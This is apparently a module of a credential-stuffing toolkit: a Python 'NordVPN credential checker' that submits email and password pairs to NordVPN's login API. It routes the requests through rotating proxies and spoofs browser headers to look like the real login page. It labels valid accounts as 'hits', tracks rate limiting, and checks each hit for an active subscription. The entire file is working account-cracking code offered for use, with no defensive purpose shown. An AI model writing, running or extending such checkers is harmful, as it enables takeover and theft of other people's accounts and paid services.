"""
nordvpn.py — NordVPN credential checker module.
"""

import requests
from scripts import get_proxy_dict


def check(email: str, password: str, proxies: list[str] = None) -> dict:
    """
    Check NordVPN credentials via API auth.
    Returns {status: 'hit'|'fail'|'error'|'ratelimit', detail: str}
    """
    session = requests.Session()
    proxy = get_proxy_dict(proxies) if proxies else None

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://nordaccount.com",
        "Referer": "https://nordaccount.com/login",
    }

    try:
        login_payload = {
            "username": email,
            "password": password,
        }

        resp = session.post(
            "https://api.nordvpn.com/v1/users/tokens",
            headers=headers, json=login_payload,
            proxies=proxy, timeout=10
        )

        if resp.status_code == 200 or resp.status_code == 201:
            body = resp.json()
            token = body.get("token", "") or body.get("access_token", "")
            if token:
                # Try to get subscription info
                sub_headers = {
                    "Authorization": f"token:{token}",
                    "User-Agent": headers["User-Agent"],
                }
                sub_resp = session.get(
                    "https://api.nordvpn.com/v1/users/services",
                    headers=sub_headers, proxies=proxy, timeout=10
                )

                detail = "Active subscription" if sub_resp.status_code == 200 and sub_resp.text.strip() != "[]" else "No active sub"
                return {"status": "hit", "detail": detail}
            else:
                return {"status": "fail", "detail": "No token returned"}

        elif resp.status_code == 401 or resp.status_code == 400:
            return {"status": "fail", "detail": "Invalid credentials"}

        elif resp.status_code == 429 or resp.status_code == 403:
            return {"status": "ratelimit", "detail": "Rate limited"}

        else:
            return {"status": "error", "detail": f"HTTP {resp.status_code}"}

    except requests.exceptions.Timeout:
        return {"status": "error", "detail": "Timeout"}
    except requests.exceptions.ProxyError:
        return {"status": "error", "detail": "Proxy error"}
    except Exception as exc:
        return {"status": "error", "detail": str(exc)[:60]}
